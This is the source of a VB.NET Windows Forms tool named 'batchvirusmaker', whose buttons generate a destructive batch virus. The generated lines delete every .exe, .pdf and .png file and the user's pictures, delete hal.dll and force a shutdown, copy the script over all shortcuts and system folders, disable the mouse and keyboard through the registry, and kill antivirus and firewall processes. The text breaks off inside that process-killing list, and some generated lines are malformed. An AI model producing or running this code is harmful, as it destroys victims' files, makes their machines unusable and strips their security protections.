Public Class batchvirusmaker

    Sub fadein()
        For fadeinside = 0.0 To 1.1 Step 0.1
            Me.Opacity = fadeinside
            Me.Refresh()
            Threading.Thread.Sleep(0.1)
        Next
    End Sub

    Sub fadeout()
        For fadeoutside = 90 To 10 Step -10
            Me.Opacity = fadeoutside / 100
            Me.Refresh()
            Threading.Thread.Sleep(0.1)
        Next
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        RichTextBox1.Text = "@echo off"
    End Sub

    Private Sub Button22_Click(sender As Object, e As EventArgs) Handles Button22.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + " REM Delete My Pictures"
        RichTextBox1.Text += Environment.NewLine + "del /f /q '%userprofile%\My Pictures\*.*'"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"

    End Sub

    Private Sub Button33_Click(sender As Object, e As EventArgs) Handles Button33.Click
        Dim result As Integer = MessageBox.Show("Do you want to clear screen?", "ClearSreen", MessageBoxButtons.YesNoCancel)
        If result = DialogResult.Cancel Then
            MessageBox.Show("Process Stopped")
        ElseIf result = DialogResult.No Then
            MessageBox.Show("Process Stopped")
        ElseIf result = DialogResult.Yes Then
            RichTextBox1.Text = "@echo off"
            MessageBox.Show("Screen Cleared")
        End If
    End Sub

    Private Sub Button20_Click(sender As Object, e As EventArgs) Handles Button20.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Infect All Lnk"
        RichTextBox1.Text += Environment.NewLine + "assoc .lnk=batfile"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*.lnk >> InfList_lnk.txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (InfList_lnk.txt) do copy %0 ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Delete All Pdf"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*.pdf >> FIleList_pdf.txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (FIleList_pdf.txt) do del ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button23_Click(sender As Object, e As EventArgs) Handles Button23.Click
        MsgBox("this is dangerous !!!")
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Spam Local Disk"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "echo %random% > 'C:\%random%.txt'"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Button24_Click(sender As Object, e As EventArgs) Handles Button24.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + " REM Spam With VBScript Msgboxes"
        RichTextBox1.Text += Environment.NewLine + "echo Do>>msgbox.vbs"
        RichTextBox1.Text += Environment.NewLine + "echo x = MsgBox(""Your computer is infected with a virus!"", 0 + 48, ""Infected"") >> MsgBox.vbs"
        RichTextBox1.Text += Environment.NewLine + "echo Loop>>msgbox.vbs"
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start """" ""msgbox.vbs"""
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"

    End Sub

    Private Sub Button25_Click(sender As Object, e As EventArgs) Handles Button25.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Start Opening Disk Tray"
        RichTextBox1.Text += Environment.NewLine + "echo Do >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "echo Set oWMP = CreateObject(""WMPlayer.OCX.7"") >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "echo Set colCDROMs = oWMP.cdromCollection >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "echo colCDROMs.Item(d).Eject  >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "echo colCDROMs.Item(d).Eject  >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "echo Loop >> ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "start "" ""opendisk.vbs"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"

    End Sub

    Private Sub Button26_Click(sender As Object, e As EventArgs) Handles Button26.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Start Windows XP Secret Song"
        RichTextBox1.Text += Environment.NewLine + "start """" ""%systemroot%\system32\oobe\images\title.wma"""
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button27_Click(sender As Object, e As EventArgs) Handles Button27.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Change Computer Time"
        RichTextBox1.Text += Environment.NewLine + "time 12:00"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button28_Click(sender As Object, e As EventArgs) Handles Button28.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Spam Printer"
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "echo SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM SPAM>> ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "notepad /P ""Spam.txt"""
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"

    End Sub

    Private Sub Button29_Click(sender As Object, e As EventArgs) Handles Button29.Click
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "rem Disable Mouse"
        RichTextBox1.Text += Environment.NewLine + "set key=""HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass"""
        RichTextBox1.Text += Environment.NewLine + "reg delete %key%"
        RichTextBox1.Text += Environment.NewLine + "reg add %key% /v Start /t REG_DWORD /d 4"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"
    End Sub

    Private Sub Button30_Click(sender As Object, e As EventArgs) Handles Button30.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + " REM Disable Keyboard"
        RichTextBox1.Text += Environment.NewLine + "echo Windows Registry Editor Version 5.00 > ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo ""Scancode Map""=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "start ""nokeyboard.reg"""
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"

    End Sub

    Private Sub Button17_Click(sender As Object, e As EventArgs) Handles Button17.Click
        MsgBox("this is dangerous !!!")
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Delete All Exe"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*.exe >> FIleList_exe.txt"
        RichTextBox1.Text += Environment.NewLine + "echo Y | FOR /F ""tokens=1,* delims=: "" %%j in (FIleList_exe.txt) do del ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + " REM ---------------------------------"
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Swap Mouse Buttons"
        RichTextBox1.Text += Environment.NewLine + "RUNDLL32(USER32.DLL, SwapMouseButton)"
        RichTextBox1.Text += Environment.NewLine + "rem ---------------------------------"

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Infect All Folders"
        RichTextBox1.Text += Environment.NewLine + "Dir %SystemRoot% /s /b > PathHost"
        RichTextBox1.Text += Environment.NewLine + "For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul"
        RichTextBox1.Text += Environment.NewLine + "Del /f /s /q PathHost > Nul"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Button16_Click(sender As Object, e As EventArgs) Handles Button16.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Delete All Png"
        RichTextBox1.Text += Environment.NewLine + "DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt"
        RichTextBox1.Text += Environment.NewLine + "vecho Y | FOR /F ""tokens=1,* delims=: "" %%j in (FIleList_png.txt) do del ""%%j:%%k"""
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Button21_Click(sender As Object, e As EventArgs) Handles Button21.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Disable Computer By Deleting hal.dll"
        RichTextBox1.Text += Environment.NewLine + "del /f /q %SystemDrive%\WINDOWS\system32\hal.dll"
        RichTextBox1.Text += Environment.NewLine + "shutdown /s /t 00"
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        RichTextBox1.Text += Environment.NewLine + "REM ---------------------------------"
        RichTextBox1.Text += Environment.NewLine + "REM Kill Anti-Virus"
        RichTextBox1.Text += Environment.NewLine + "net stop ""Security Center"""
        RichTextBox1.Text += Environment.NewLine + "netsh firewall set opmode mode=disable"
        RichTextBox1.Text += Environment.NewLine + "tskill /A av*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A fire*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A anti*"
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A spy*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A bullguard"
        RichTextBox1.Text += Environment.NewLine + "tskill /A PersFw"
        RichTextBox1.Text += Environment.NewLine + "tskill /A KAV*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ZONEALARM"
        RichTextBox1.Text += Environment.NewLine + "tskill /A SAFEWEB"
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A OUTPOST"
        RichTextBox1.Text += Environment.NewLine + "tskill /A nv*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A nav*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A F-*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ESAFE"
        RichTextBox1.Text += Environment.NewLine + "tskill /A cle"
        RichTextBox1.Text += Environment.NewLine + "cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A BLACKICE"
        RichTextBox1.Text += Environment.NewLine + "tskill /A def*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A kav"
        RichTextBox1.Text += Environment.NewLine + "tskill /A kav*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A avg*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ash*"
        RichTextBox1.Text += Environment.NewLine + " cls()"
        RichTextBox1.Text += Environment.NewLine + "tskill /A aswupdsv"
        RichTextBox1.Text += Environment.NewLine + "tskill /A ewid*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A guard*"
        RichTextBox1.Text += Environment.NewLine + "tskill /A guar*"
